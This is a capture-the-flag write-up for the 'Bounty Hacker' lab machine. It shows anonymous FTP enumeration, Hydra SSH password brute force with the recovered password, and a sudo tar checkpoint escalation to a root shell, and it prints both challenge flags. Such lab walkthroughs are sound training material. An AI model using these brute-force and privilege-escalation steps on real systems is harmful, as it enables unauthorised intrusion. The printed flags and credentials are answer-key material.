## üîç Enumeration

- As always start with Nmap and Gobuster.

  ```

- When I visited web page I found nothing except GOATEST ANIME EVER OFC!!! ‚ù§Ô∏è
  
- Since we can login as Anonymous with FTP, let's do that. There's two files in that directory, get them both to your Kali.

  ```
  ftp 10.10.192.55
  Anonymous
  
  
  ftp> ls
  229 Entering Extended Passive Mode (|||64010|)
  pwd
  ^C
  receive aborted. Waiting for remote to finish abort.
  ftp> 
  ftp> passive
  Passive mode: off; fallback to active mode: off.
  ftp> ls
  200 EPRT command successful. Consider using EPSV.
  150 Here comes the directory listing.
  -rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
  -rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
  226 Directory send OK.
  ftp> pwd
  Remote directory: /

  cat task.txt    
  1.) Protect Vicious.
  2.) Plan for Red Eye pickup on the moon.

- Beautiful, we even have brute force material, let's do it.

  ```
  hydra -l lin -P locks.txt 10.10.192.55 ssh
  [22][ssh] host: 10.10.192.55   login: lin   password: RedDr4gonSynd1cat3
  1 of 1 target successfully completed, 1 valid password found
  ```

## üßç User Privilege Escalation

- After logging in with SSH, first flag is already there. Moving to root flag.

  ```
  lin@bountyhacker:~/Desktop$ pwd
  /home/lin/Desktop
  
  lin@bountyhacker:~/Desktop$ ls
  user.txt
  
  lin@bountyhacker:~/Desktop$ cat user.txt 
  THM{CR1M3_SyNd1C4T3}
  ```
  
---

## üëë Root Privilege Escalation

- For this one `sudo -l` did all the job, you can find the exploit on GTFOBins.

  ```
  lin@bountyhacker:~/Desktop$ sudo -l
  [sudo] password for lin: 
  Matching Defaults entries for lin on bountyhacker:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User lin may run the following commands on bountyhacker:
      (root) /bin/tar
  
  lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
  tar: Removing leading `/' from member names
  # whoami
  root
  # id
  uid=0(root) gid=0(root) groups=0(root)
  # cat /root/root.txt
  THM{80UN7Y_h4cK3r}
  ```
  
- That's all folks, I still can't believe that I did this CTF in less than 5 minutes lol. Happy Hacking!

## üí¨ Notes & Reflections

- What was challenging in this room for me?
  `/`

- What did I learn?
  `That I improved my skills a lot, I finished this CTF in less than 5 min. Started at 22:03 and finished at 22:07.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! ü§ü
